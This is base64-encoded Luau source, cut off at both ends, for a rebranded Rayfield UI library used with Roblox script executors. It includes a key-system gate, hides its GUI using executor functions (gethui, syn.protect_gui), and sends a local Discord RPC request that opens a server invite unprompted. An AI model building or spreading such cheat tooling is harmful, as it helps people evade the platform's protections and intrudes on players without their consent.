wiIG9yIGNoaWxkLkNsYXNzTmFtZSA9PSAiVGV4dEJveCIgb3IgY2hpbGQuQ2xhc3NOYW1lID09ICJJbWFnZUJ1dHRvbiIgb3IgY2hpbGQuQ2xhc3NOYW1lID09ICJJbWFnZUxhYmVsIiB0aGVuCgkJCQkJCQkJY2hpbGQuVmlzaWJsZSA9IGZhbHNlCgkJCQkJCQllbmQKCQkJCQkJZW5kCgkJCQkJZW5kCgkJCQllbmQKCQkJZW5kCgkJZW5kCgllbmQKCglUd2VlblNlcnZpY2U6Q3JlYXRlKGRyYWdCYXJDb3NtZXRpYywgVHdlZW5JbmZvLm5ldygwLjI1LCBFbnVtLkVhc2luZ1N0eWxlLkJhY2ssIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb3BiYXIuVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC41LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCVR3ZWVuU2VydmljZTpDcmVhdGUoTWFpbi5TaGFkb3cuSW1hZ2UsIFR3ZWVuSW5mby5uZXcoMC41LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0ltYWdlVHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb3BiYXIuQ29ybmVyUmVwYWlyLCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb3BiYXIuRGl2aWRlciwgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCVR3ZWVuU2VydmljZTpDcmVhdGUoTWFpbiwgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7U2l6ZSA9IFVEaW0yLm5ldygwLCA0OTUsIDAsIDQ1KX0pOlBsYXkoKQoJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb3BiYXIsIFR3ZWVuSW5mby5uZXcoMC41LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1NpemUgPSBVRGltMi5uZXcoMCwgNDk1LCAwLCA0NSl9KTpQbGF5KCkKCgl0YXNrLndhaXQoMC4zKQoKCUVsZW1lbnRzLlZpc2libGUgPSBmYWxzZQoJVGFiTGlzdC5WaXNpYmxlID0gZmFsc2UKCgl0YXNrLndhaXQoMC4yKQoJRGVib3VuY2UgPSBmYWxzZQplbmQKCmxvY2FsIGZ1bmN0aW9uIHVwZGF0ZVNldHRpbmdzKCkKCWxvY2FsIGVuY29kZWQKCWxvY2FsIHN1Y2Nlc3MsIGVyciA9IHBjYWxsKGZ1bmN0aW9uKCkKCQllbmNvZGVkID0gSHR0cFNlcnZpY2U6SlNPTkVuY29kZShzZXR0aW5nc1RhYmxlKQoJZW5kKQoKCWlmIHN1Y2Nlc3MgdGhlbgoJCWlmIHVzZVN0dWRpbyB0aGVuCgkJCWlmIHNjcmlwdC5QYXJlbnRbJ2dldC52YWwnXSB0aGVuCgkJCQlzY3JpcHQuUGFyZW50WydnZXQudmFsJ10uVmFsdWUgPSBlbmNvZGVkCgkJCWVuZAoJCWVuZAoJCWlmIHdyaXRlZmlsZSB0aGVuCgkJCXdyaXRlZmlsZShSYXlmaWVsZEZvbGRlci4uJy9zZXR0aW5ncycuLkNvbmZpZ3VyYXRpb25FeHRlbnNpb24sIGVuY29kZWQpCgkJZW5kCgllbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBjcmVhdGVTZXR0aW5ncyh3aW5kb3cpCglpZiBub3QgKHdyaXRlZmlsZSBhbmQgaXNmaWxlIGFuZCByZWFkZmlsZSBhbmQgaXNmb2xkZXIgYW5kIG1ha2Vmb2xkZXIpIGFuZCBub3QgdXNlU3R1ZGlvIHRoZW4KCQlpZiBUb3BiYXJbJ1NldHRpbmdzJ10gdGhlbiBUb3BiYXIuU2V0dGluZ3MuVmlzaWJsZSA9IGZhbHNlIGVuZAoJCVRvcGJhclsnU2VhcmNoJ10uUG9zaXRpb24gPSBVRGltMi5uZXcoMSwgLTc1LCAwLjUsIDApCgkJd2FybignQ2FuXCd0IGNyZWF0ZSBzZXR0aW5ncyBhcyBubyBmaWxlLXNhdmluZyBmdW5jdGlvbmFsaXR5IGlzIGF2YWlsYWJsZS4nKQoJCXJldHVybgoJZW5kCgoJbG9jYWwgbmV3VGFiID0gd2luZG93OkNyZWF0ZVRhYignUmF5ZmllbGQgU2V0dGluZ3MnLCAwLCB0cnVlKQoKCWlmIFRhYkxpc3RbJ1JheWZpZWxkIFNldHRpbmdzJ10gdGhlbgoJCVRhYkxpc3RbJ1JheWZpZWxkIFNldHRpbmdzJ10uTGF5b3V0T3JkZXIgPSAxMDAwCgllbmQKCglpZiBFbGVtZW50c1snUmF5ZmllbGQgU2V0dGluZ3MnXSB0aGVuCgkJRWxlbWVudHNbJ1JheWZpZWxkIFNldHRpbmdzJ10uTGF5b3V0T3JkZXIgPSAxMDAwCgllbmQKCgktLSBDcmVhdGUgc2VjdGlvbnMgYW5kIGVsZW1lbnRzCglmb3IgY2F0ZWdvcnlOYW1lLCBzZXR0aW5nQ2F0ZWdvcnkgaW4gcGFpcnMoc2V0dGluZ3NUYWJsZSkgZG8KCQluZXdUYWI6Q3JlYXRlU2VjdGlvbihjYXRlZ29yeU5hbWUpCgoJCWZvciBfLCBzZXR0aW5nIGluIHBhaXJzKHNldHRpbmdDYXRlZ29yeSkgZG8KCQkJaWYgc2V0dGluZy5UeXBlID09ICdpbnB1dCcgdGhlbgoJCQkJc2V0dGluZy5FbGVtZW50ID0gbmV3VGFiOkNyZWF0ZUlucHV0KHsKCQkJCQlOYW1lID0gc2V0dGluZy5OYW1lLAoJCQkJCUN1cnJlbnRWYWx1ZSA9IHNldHRpbmcuVmFsdWUsCgkJCQkJUGxhY2Vob2xkZXJUZXh0ID0gc2V0dGluZy5QbGFjZWhvbGRlciwKCQkJCQlFeHQgPSB0cnVlLAoJCQkJCVJlbW92ZVRleHRBZnRlckZvY3VzTG9zdCA9IHNldHRpbmcuQ2xlYXJPbkZvY3VzLAoJCQkJCUNhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCgkJCQkJCXNldHRpbmcuVmFsdWUgPSBWYWx1ZQoJCQkJCQl1cGRhdGVTZXR0aW5ncygpCgkJCQkJZW5kLAoJCQkJfSkKCQkJZWxzZWlmIHNldHRpbmcuVHlwZSA9PSAndG9nZ2xlJyB0aGVuCgkJCQlzZXR0aW5nLkVsZW1lbnQgPSBuZXdUYWI6Q3JlYXRlVG9nZ2xlKHsKCQkJCQlOYW1lID0gc2V0dGluZy5OYW1lLAoJCQkJCUN1cnJlbnRWYWx1ZSA9IHNldHRpbmcuVmFsdWUsCgkJCQkJRXh0ID0gdHJ1ZSwKCQkJCQlDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQoJCQkJCQlzZXR0aW5nLlZhbHVlID0gVmFsdWUKCQkJCQkJdXBkYXRlU2V0dGluZ3MoKQoJCQkJCWVuZCwKCQkJCX0pCgkJCWVsc2VpZiBzZXR0aW5nLlR5cGUgPT0gJ2JpbmQnIHRoZW4KCQkJCXNldHRpbmcuRWxlbWVudCA9IG5ld1RhYjpDcmVhdGVLZXliaW5kKHsKCQkJCQlOYW1lID0gc2V0dGluZy5OYW1lLAoJCQkJCUN1cnJlbnRLZXliaW5kID0gc2V0dGluZy5WYWx1ZSwKCQkJCQlIb2xkVG9JbnRlcmFjdCA9IGZhbHNlLAoJCQkJCUV4dCA9IHRydWUsCgkJCQkJQ2FsbE9uQ2hhbmdlID0gdHJ1ZSwKCQkJCQlDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQoJCQkJCQlzZXR0aW5nLlZhbHVlID0gVmFsdWUKCQkJCQkJdXBkYXRlU2V0dGluZ3MoKQoJCQkJCWVuZCwKCQkJCX0pCgkJCWVuZAoJCWVuZAoJZW5kCgoJc2V0dGluZ3NDcmVhdGVkID0gdHJ1ZQoJbG9hZFNldHRpbmdzKCkKCXVwZGF0ZVNldHRpbmdzKCkKZW5kCgoKCmZ1bmN0aW9uIFJheWZpZWxkTGlicmFyeTpDcmVhdGVXaW5kb3coU2V0dGluZ3MpCglpZiBSYXlmaWVsZDpGaW5kRmlyc3RDaGlsZCgnTG9hZGluZycpIHRoZW4KCQlpZiBnZXRnZW52IGFuZCBub3QgZ2V0Z2VudigpLnJheWZpZWxkQ2FjaGVkIHRoZW4KCQkJUmF5ZmllbGQuRW5hYmxlZCA9IHRydWUKCQkJUmF5ZmllbGQuTG9hZGluZy5WaXNpYmxlID0gdHJ1ZQoKCQkJdGFzay53YWl0KDEuNCkKCQkJUmF5ZmllbGQuTG9hZGluZy5WaXNpYmxlID0gZmFsc2UKCQllbmQKCWVuZAoKCWlmIGdldGdlbnYgdGhlbiBnZXRnZW52KCkucmF5ZmllbGRDYWNoZWQgPSB0cnVlIGVuZAoKCWlmIG5vdCBjb3JyZWN0QnVpbGQgYW5kIG5vdCBTZXR0aW5ncy5EaXNhYmxlQnVpbGRXYXJuaW5ncyB0aGVuCgkJdGFzay5kZWxheSgzLCAKCQkJZnVuY3Rpb24oKSAKCQkJCVJheWZpZWxkTGlicmFyeTpOb3RpZnkoe1RpdGxlID0gJ0J1aWxkIE1pc21hdGNoJywgQ29udGVudCA9ICdSYXlmaWVsZCBtYXkgZW5jb3VudGVyIGlzc3VlcyBhcyB5b3UgYXJlIHJ1bm5pbmcgYW4gaW5jb21wYXRpYmxlIGludGVyZmFjZSB2ZXJzaW9uICgnLi4gKChSYXlmaWVsZDpGaW5kRmlyc3RDaGlsZCgnQnVpbGQnKSBhbmQgUmF5ZmllbGQuQnVpbGQuVmFsdWUpIG9yICdObyBCdWlsZCcpIC4uJykuXG5cblRoaXMgdmVyc2lvbiBvZiBSYXlmaWVsZCBpcyBpbnRlbmRlZCBmb3IgaW50ZXJmYWNlIGJ1aWxkICcuLkludGVyZmFjZUJ1aWxkLi4nLlxuXG5UcnkgcmVqb2luaW5nIGFuZCB0aGVuIHJ1biB0aGUgc2NyaXB0IHR3aWNlLicsIEltYWdlID0gNDMzNTQ4Nzg2NiwgRHVyYXRpb24gPSAxNX0pCQkKCQkJZW5kKQoJZW5kCgoJaWYgaXNmb2xkZXIgYW5kIG5vdCBpc2ZvbGRlcihSYXlmaWVsZEZvbGRlcikgdGhlbgoJCW1ha2Vmb2xkZXIoUmF5ZmllbGRGb2xkZXIpCgllbmQKCglsb2NhbCBQYXNzdGhyb3VnaCA9IGZhbHNlCglUb3BiYXIuVGl0bGUuVGV4dCA9IFNldHRpbmdzLk5hbWUKCglNYWluLlNpemUgPSBVRGltMi5uZXcoMCwgNDIwLCAwLCAxMDApCglNYWluLlZpc2libGUgPSB0cnVlCglNYWluLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCglpZiBNYWluOkZpbmRGaXJzdENoaWxkKCdOb3RpY2UnKSB0aGVuIE1haW4uTm90aWNlLlZpc2libGUgPSBmYWxzZSBlbmQKCU1haW4uU2hhZG93LkltYWdlLkltYWdlVHJhbnNwYXJlbmN5ID0gMQoKCUxvYWRpbmdGcmFtZS5UaXRsZS5UZXh0VHJhbnNwYXJlbmN5ID0gMQoJTG9hZGluZ0ZyYW1lLlN1YnRpdGxlLlRleHRUcmFuc3BhcmVuY3kgPSAxCgoJTG9hZGluZ0ZyYW1lLlZlcnNpb24uVGV4dFRyYW5zcGFyZW5jeSA9IDEKCUxvYWRpbmdGcmFtZS5UaXRsZS5UZXh0ID0gU2V0dGluZ3MuTG9hZGluZ1RpdGxlIG9yICJSYXlmaWVsZCIKCUxvYWRpbmdGcmFtZS5TdWJ0aXRsZS5UZXh0ID0gU2V0dGluZ3MuTG9hZGluZ1N1YnRpdGxlIG9yICJJbnRlcmZhY2UgU3VpdGUiCgoJaWYgU2V0dGluZ3MuTG9hZGluZ1RpdGxlIH49ICJSYXlmaWVsZCBJbnRlcmZhY2UgU3VpdGUiIHRoZW4KCQlMb2FkaW5nRnJhbWUuVmVyc2lvbi5UZXh0ID0gImpvYW9fbW9kcyIKCWVuZAoKCWlmIFNldHRpbmdzLkljb24gYW5kIFNldHRpbmdzLkljb24gfj0gMCBhbmQgVG9wYmFyOkZpbmRGaXJzdENoaWxkKCdJY29uJykgdGhlbgoJCVRvcGJhci5JY29uLlZpc2libGUgPSB0cnVlCgkJVG9wYmFyLlRpdGxlLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDQ3LCAwLjUsIDApCgoJCWlmIFNldHRpbmdzLkljb24gdGhlbgoJCQlpZiB0eXBlb2YoU2V0dGluZ3MuSWNvbikgPT0gJ3N0cmluZycgYW5kIEljb25zIHRoZW4KCQkJCWxvY2FsIGFzc2V0ID0gZ2V0SWNvbihTZXR0aW5ncy5JY29uKQoKCQkJCVRvcGJhci5JY29uLkltYWdlID0gJ3JieGFzc2V0aWQ6Ly8nLi5hc3NldC5pZAoJCQkJVG9wYmFyLkljb24uSW1hZ2VSZWN0T2Zmc2V0ID0gYXNzZXQuaW1hZ2VSZWN0T2Zmc2V0CgkJCQlUb3BiYXIuSWNvbi5JbWFnZVJlY3RTaXplID0gYXNzZXQuaW1hZ2VSZWN0U2l6ZQoJCQllbHNlCgkJCQlUb3BiYXIuSWNvbi5JbWFnZSA9IGdldEFzc2V0VXJpKFNldHRpbmdzLkljb24pCgkJCWVuZAoJCWVsc2UKCQkJVG9wYmFyLkljb24uSW1hZ2UgPSAicmJ4YXNzZXRpZDovLyIgLi4gMAoJCWVuZAoJZW5kCgoJaWYgZHJhZ0JhciB0aGVuCgkJZHJhZ0Jhci5WaXNpYmxlID0gZmFsc2UKCQlkcmFnQmFyQ29zbWV0aWMuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKCQlkcmFnQmFyLlZpc2libGUgPSB0cnVlCgllbmQKCglpZiBTZXR0aW5ncy5UaGVtZSB0aGVuCgkJbG9jYWwgc3VjY2VzcywgcmVzdWx0ID0gcGNhbGwoQ2hhbmdlVGhlbWUsIFNldHRpbmdzLlRoZW1lKQoJCWlmIG5vdCBzdWNjZXNzIHRoZW4KCQkJbG9jYWwgc3VjY2VzcywgcmVzdWx0MiA9IHBjYWxsKENoYW5nZVRoZW1lLCAnRGVmYXVsdCcpCgkJCWlmIG5vdCBzdWNjZXNzIHRoZW4KCQkJCXdhcm4oJ0NSSVRJQ0FMIEVSUk9SIC0gTk8gREVGQVVMVCBUSEVNRScpCgkJCQlwcmludChyZXN1bHQyKQoJCQllbmQKCQkJd2FybignaXNzdWUgcmVuZGVyaW5nIHRoZW1lLiBubyB0aGVtZSBvbiBmaWxlJykKCQkJcHJpbnQocmVzdWx0KQoJCWVuZAoJZW5kCgoJVG9wYmFyLlZpc2libGUgPSBmYWxzZQoJRWxlbWVudHMuVmlzaWJsZSA9IGZhbHNlCglMb2FkaW5nRnJhbWUuVmlzaWJsZSA9IHRydWUKCglpZiBub3QgU2V0dGluZ3MuRGlzYWJsZVJheWZpZWxkUHJvbXB0cyB0aGVuCgkJdGFzay5zcGF3bihmdW5jdGlvbigpCgkJCXdoaWxlIHRydWUgZG8KCQkJCXRhc2sud2FpdChtYXRoLnJhbmRvbSgxODAsIDYwMCkpCgkJCQlSYXlmaWVsZExpYnJhcnk6Tm90aWZ5KHsKCQkJCQlUaXRsZSA9ICJSYXlmaWVsZCBJbnRlcmZhY2UiLAoJCQkJCUNvbnRlbnQgPSAiRW5qb3lpbmcgdGhpcyBVSSBsaWJyYXJ5PyBGaW5kIGl0IGF0IHNpcml1cy5tZW51L2Rpc2NvcmQiLAoJCQkJCUR1cmF0aW9uID0gNywKCQkJCQlJbWFnZSA9IDQzNzAwMzMxODUsCgkJCQl9KQoJCQllbmQKCQllbmQpCgllbmQKCglwY2FsbChmdW5jdGlvbigpCgkJaWYgbm90IFNldHRpbmdzLkNvbmZpZ3VyYXRpb25TYXZpbmcuRmlsZU5hbWUgdGhlbgoJCQlTZXR0aW5ncy5Db25maWd1cmF0aW9uU2F2aW5nLkZpbGVOYW1lID0gdG9zdHJpbmcoZ2FtZS5QbGFjZUlkKQoJCWVuZAoKCQlpZiBTZXR0aW5ncy5Db25maWd1cmF0aW9uU2F2aW5nLkVuYWJsZWQgPT0gbmlsIHRoZW4KCQkJU2V0dGluZ3MuQ29uZmlndXJhdGlvblNhdmluZy5FbmFibGVkID0gZmFsc2UKCQllbmQKCgkJQ0ZpbGVOYW1lID0gU2V0dGluZ3MuQ29uZmlndXJhdGlvblNhdmluZy5GaWxlTmFtZQoJCUNvbmZpZ3VyYXRpb25Gb2xkZXIgPSBTZXR0aW5ncy5Db25maWd1cmF0aW9uU2F2aW5nLkZvbGRlck5hbWUgb3IgQ29uZmlndXJhdGlvbkZvbGRlcgoJCUNFbmFibGVkID0gU2V0dGluZ3MuQ29uZmlndXJhdGlvblNhdmluZy5FbmFibGVkCgoJCWlmIFNldHRpbmdzLkNvbmZpZ3VyYXRpb25TYXZpbmcuRW5hYmxlZCB0aGVuCgkJCWlmIG5vdCBpc2ZvbGRlcihDb25maWd1cmF0aW9uRm9sZGVyKSB0aGVuCgkJCQltYWtlZm9sZGVyKENvbmZpZ3VyYXRpb25Gb2xkZXIpCgkJCWVuZAkKCQllbmQKCWVuZCkKCgoJbWFrZURyYWdnYWJsZShNYWluLCBUb3BiYXIsIGZhbHNlLCB7ZHJhZ09mZnNldCwgZHJhZ09mZnNldE1vYmlsZX0pCglpZiBkcmFnQmFyIHRoZW4gZHJhZ0Jhci5Qb3NpdGlvbiA9IHVzZU1vYmlsZVNpemluZyBhbmQgVURpbTIubmV3KDAuNSwgMCwgMC41LCBkcmFnT2Zmc2V0TW9iaWxlKSBvciBVRGltMi5uZXcoMC41LCAwLCAwLjUsIGRyYWdPZmZzZXQpIG1ha2VEcmFnZ2FibGUoTWFpbiwgZHJhZ0ludGVyYWN0LCB0cnVlLCB7ZHJhZ09mZnNldCwgZHJhZ09mZnNldE1vYmlsZX0pIGVuZAoKCWZvciBfLCBUYWJCdXR0b24gaW4gaXBhaXJzKFRhYkxpc3Q6R2V0Q2hpbGRyZW4oKSkgZG8KCQlpZiBUYWJCdXR0b24uQ2xhc3NOYW1lID09ICJGcmFtZSIgYW5kIFRhYkJ1dHRvbi5OYW1lIH49ICJQbGFjZWhvbGRlciIgdGhlbgoJCQlUYWJCdXR0b24uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKCQkJVGFiQnV0dG9uLlRpdGxlLlRleHRUcmFuc3BhcmVuY3kgPSAxCgkJCVRhYkJ1dHRvbi5JbWFnZS5JbWFnZVRyYW5zcGFyZW5jeSA9IDEKCQkJVGFiQnV0dG9uLlVJU3Ryb2tlLlRyYW5zcGFyZW5jeSA9IDEKCQllbmQKCWVuZAoKCWlmIFNldHRpbmdzLkRpc2NvcmQgYW5kIG5vdCB1c2VTdHVkaW8gdGhlbgoJCWlmIGlzZm9sZGVyIGFuZCBub3QgaXNmb2xkZXIoUmF5ZmllbGRGb2xkZXIuLiIvRGlzY29yZCBJbnZpdGVzIikgdGhlbgoJCQltYWtlZm9sZGVyKFJheWZpZWxkRm9sZGVyLi4iL0Rpc2NvcmQgSW52aXRlcyIpCgkJZW5kCgoJCWlmIGlzZmlsZSBhbmQgbm90IGlzZmlsZShSYXlmaWVsZEZvbGRlci4uIi9EaXNjb3JkIEludml0ZXMiLi4iLyIuLlNldHRpbmdzLkRpc2NvcmQuSW52aXRlLi5Db25maWd1cmF0aW9uRXh0ZW5zaW9uKSB0aGVuCgkJCWlmIHJlcXVlc3QgdGhlbgoJCQkJcGNhbGwoZnVuY3Rpb24oKQoJCQkJCXJlcXVlc3QoewoJCQkJCQlVcmwgPSAnaHR0cDovLzEyNy4wLjAuMTo2NDYzL3JwYz92PTEnLAoJCQkJCQlNZXRob2QgPSAnUE9TVCcsCgkJCQkJCUhlYWRlcnMgPSB7CgkJCQkJCQlbJ0NvbnRlbnQtVHlwZSddID0gJ2FwcGxpY2F0aW9uL2pzb24nLAoJCQkJCQkJT3JpZ2luID0gJ2h0dHBzOi8vZGlzY29yZC5jb20nCgkJCQkJCX0sCgkJCQkJCUJvZHkgPSBIdHRwU2VydmljZTpKU09ORW5jb2RlKHsKCQkJCQkJCWNtZCA9ICdJTlZJVEVfQlJPV1NFUicsCgkJCQkJCQlub25jZSA9IEh0dHBTZXJ2aWNlOkdlbmVyYXRlR1VJRChmYWxzZSksCgkJCQkJCQlhcmdzID0ge2NvZGUgPSBTZXR0aW5ncy5EaXNjb3JkLkludml0ZX0KCQkJCQkJfSkKCQkJCQl9KQoJCQkJZW5kKQoJCQllbmQKCgkJCWlmIFNldHRpbmdzLkRpc2NvcmQuUmVtZW1iZXJKb2lucyB0aGVuIC0tIFdlIGRvIGxvZ2ljIHRoaXMgd2F5IHNvIGlmIHRoZSBkZXZlbG9wZXIgY2hhbmdlcyB0aGlzIHNldHRpbmcsIHRoZSB1c2VyIHN0aWxsIHdvbid0IGJlIHByb21wdGVkLCBvbmx5IG5ldyB1c2VycwoJCQkJd3JpdGVmaWxlKFJheWZpZWxkRm9sZGVyLi4iL0Rpc2NvcmQgSW52aXRlcyIuLiIvIi4uU2V0dGluZ3MuRGlzY29yZC5JbnZpdGUuLkNvbmZpZ3VyYXRpb25FeHRlbnNpb24sIlJheWZpZWxkIFJlbWVtYmVySm9pbnMgaXMgdHJ1ZSBmb3IgdGhpcyBpbnZpdGUsIHRoaXMgaW52aXRlIHdpbGwgbm90IGFzayB5b3UgdG8gam9pbiBhZ2FpbiIpCgkJCWVuZAoJCWVuZAoJZW5kCgoJaWYgKFNldHRpbmdzLktleVN5c3RlbSkgdGhlbgoJCWlmIG5vdCBTZXR0aW5ncy5LZXlTZXR0aW5ncyB0aGVuCgkJCVBhc3N0aHJvdWdoID0gdHJ1ZQoJCQlyZXR1cm4KCQllbmQKCgkJaWYgaXNmb2xkZXIgYW5kIG5vdCBpc2ZvbGRlcihSYXlmaWVsZEZvbGRlci4uIi9LZXkgU3lzdGVtIikgdGhlbgoJCQltYWtlZm9sZGVyKFJheWZpZWxkRm9sZGVyLi4iL0tleSBTeXN0ZW0iKQoJCWVuZAoKCQlpZiB0eXBlb2YoU2V0dGluZ3MuS2V5U2V0dGluZ3MuS2V5KSA9PSAic3RyaW5nIiB0aGVuIFNldHRpbmdzLktleVNldHRpbmdzLktleSA9IHtTZXR0aW5ncy5LZXlTZXR0aW5ncy5LZXl9IGVuZAoKCQlpZiBTZXR0aW5ncy5LZXlTZXR0aW5ncy5HcmFiS2V5RnJvbVNpdGUgdGhlbgoJCQlmb3IgaSwgS2V5IGluIGlwYWlycyhTZXR0aW5ncy5LZXlTZXR0aW5ncy5LZXkpIGRvCgkJCQlsb2NhbCBTdWNjZXNzLCBSZXNwb25zZSA9IHBjYWxsKGZ1bmN0aW9uKCkKCQkJCQlTZXR0aW5ncy5LZXlTZXR0aW5ncy5LZXlbaV0gPSB0b3N0cmluZyhnYW1lOkh0dHBHZXQoS2V5KTpnc3ViKCJbXG5ccl0iLCAiICIpKQoJCQkJCVNldHRpbmdzLktleVNldHRpbmdzLktleVtpXSA9IHN0cmluZy5nc3ViKFNldHRpbmdzLktleVNldHRpbmdzLktleVtpXSwgIiAiLCAiIikKCQkJCWVuZCkKCQkJCWlmIG5vdCBTdWNjZXNzIHRoZW4KCQkJCQlwcmludCgiUmF5ZmllbGQgfCAiLi5LZXkuLiIgRXJyb3IgIiAuLnRvc3RyaW5nKFJlc3BvbnNlKSkKCQkJCQl3YXJuKCdDaGVjayBkb2NzLnNpcml1cy5tZW51IGZvciBoZWxwIHdpdGggUmF5ZmllbGQgc3BlY2lmaWMgZGV2ZWxvcG1lbnQuJykKCQkJCWVuZAoJCQllbmQKCQllbmQKCgkJaWYgbm90IFNldHRpbmdzLktleVNldHRpbmdzLkZpbGVOYW1lIHRoZW4KCQkJU2V0dGluZ3MuS2V5U2V0dGluZ3MuRmlsZU5hbWUgPSAiTm8gZmlsZSBuYW1lIHNwZWNpZmllZCIKCQllbmQKCgkJaWYgaXNmaWxlIGFuZCBpc2ZpbGUoUmF5ZmllbGRGb2xkZXIuLiIvS2V5IFN5c3RlbSIuLiIvIi4uU2V0dGluZ3MuS2V5U2V0dGluZ3MuRmlsZU5hbWUuLkNvbmZpZ3VyYXRpb25FeHRlbnNpb24pIHRoZW4KCQkJZm9yIF8sIE1LZXkgaW4gaXBhaXJzKFNldHRpbmdzLktleVNldHRpbmdzLktleSkgZG8KCQkJCWlmIHN0cmluZy5maW5kKHJlYWRmaWxlKFJheWZpZWxkRm9sZGVyLi4iL0tleSBTeXN0ZW0iLi4iLyIuLlNldHRpbmdzLktleVNldHRpbmdzLkZpbGVOYW1lLi5Db25maWd1cmF0aW9uRXh0ZW5zaW9uKSwgTUtleSkgdGhlbgoJCQkJCVBhc3N0aHJvdWdoID0gdHJ1ZQoJCQkJZW5kCgkJCWVuZAoJCWVuZAoKCQlpZiBub3QgUGFzc3Rocm91Z2ggdGhlbgoJCQlsb2NhbCBBdHRlbXB0c1JlbWFpbmluZyA9IG1hdGgucmFuZG9tKDIsIDUpCgkJCVJheWZpZWxkLkVuYWJsZWQgPSBmYWxzZQoJCQlsb2NhbCBLZXlVSSA9IHVzZVN0dWRpbyBhbmQgc2NyaXB0LlBhcmVudDpGaW5kRmlyc3RDaGlsZCgnS2V5Jykgb3IgZ2FtZTpHZXRPYmplY3RzKCJyYnhhc3NldGlkOi8vMTEzODAwMzYyMzUiKVsxXQoKCQkJS2V5VUkuRW5hYmxlZCA9IHRydWUKCgkJCWlmIGdldGh1aSB0aGVuCgkJCQlLZXlVSS5QYXJlbnQgPSBnZXRodWkoKQoJCQllbHNlaWYgc3luIGFuZCBzeW4ucHJvdGVjdF9ndWkgdGhlbiAKCQkJCXN5bi5wcm90ZWN0X2d1aShLZXlVSSkKCQkJCUtleVVJLlBhcmVudCA9IENvcmVHdWkKCQkJZWxzZWlmIG5vdCB1c2VTdHVkaW8gYW5kIENvcmVHdWk6RmluZEZpcnN0Q2hpbGQoIlJvYmxveEd1aSIpIHRoZW4KCQkJCUtleVVJLlBhcmVudCA9IENvcmVHdWk6RmluZEZpcnN0Q2hpbGQoIlJvYmxveEd1aSIpCgkJCWVsc2VpZiBub3QgdXNlU3R1ZGlvIHRoZW4KCQkJCUtleVVJLlBhcmVudCA9IENvcmVHdWkKCQkJZW5kCgoJCQlpZiBnZXRodWkgdGhlbgoJCQkJZm9yIF8sIEludGVyZmFjZSBpbiBpcGFpcnMoZ2V0aHVpKCk6R2V0Q2hpbGRyZW4oKSkgZG8KCQkJCQlpZiBJbnRlcmZhY2UuTmFtZSA9PSBLZXlVSS5OYW1lIGFuZCBJbnRlcmZhY2Ugfj0gS2V5VUkgdGhlbgoJCQkJCQlJbnRlcmZhY2UuRW5hYmxlZCA9IGZhbHNlCgkJCQkJCUludGVyZmFjZS5OYW1lID0gIktleVVJLU9sZCIKCQkJCQllbmQKCQkJCWVuZAoJCQllbHNlaWYgbm90IHVzZVN0dWRpbyB0aGVuCgkJCQlmb3IgXywgSW50ZXJmYWNlIGluIGlwYWlycyhDb3JlR3VpOkdldENoaWxkcmVuKCkpIGRvCgkJCQkJaWYgSW50ZXJmYWNlLk5hbWUgPT0gS2V5VUkuTmFtZSBhbmQgSW50ZXJmYWNlIH49IEtleVVJIHRoZW4KCQkJCQkJSW50ZXJmYWNlLkVuYWJsZWQgPSBmYWxzZQoJCQkJCQlJbnRlcmZhY2UuTmFtZSA9ICJLZXlVSS1PbGQiCgkJCQkJZW5kCgkJCQllbmQKCQkJZW5kCgoJCQlsb2NhbCBLZXlNYWluID0gS2V5VUkuTWFpbgoJCQlLZXlNYWluLlRpdGxlLlRleHQgPSBTZXR0aW5ncy5LZXlTZXR0aW5ncy5UaXRsZSBvciBTZXR0aW5ncy5OYW1lCgkJCUtleU1haW4uU3VidGl0bGUuVGV4dCA9IFNldHRpbmdzLktleVNldHRpbmdzLlN1YnRpdGxlIG9yICJLZXkgU3lzdGVtIgoJCQlLZXlNYWluLk5vdGVNZXNzYWdlLlRleHQgPSBTZXR0aW5ncy5LZXlTZXR0aW5ncy5Ob3RlIG9yICJObyBpbnN0cnVjdGlvbnMiCgoJCQlLZXlNYWluLlNpemUgPSBVRGltMi5uZXcoMCwgNDY3LCAwLCAxNzUpCgkJCUtleU1haW4uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKCQkJS2V5TWFpbi5TaGFkb3cuSW1hZ2UuSW1hZ2VUcmFuc3BhcmVuY3kgPSAxCgkJCUtleU1haW4uVGl0bGUuVGV4dFRyYW5zcGFyZW5jeSA9IDEKCQkJS2V5TWFpbi5TdWJ0aXRsZS5UZXh0VHJhbnNwYXJlbmN5ID0gMQoJCQlLZXlNYWluLktleU5vdGUuVGV4dFRyYW5zcGFyZW5jeSA9IDEKCQkJS2V5TWFpbi5JbnB1dC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQoJCQlLZXlNYWluLklucHV0LlVJU3Ryb2tlLlRyYW5zcGFyZW5jeS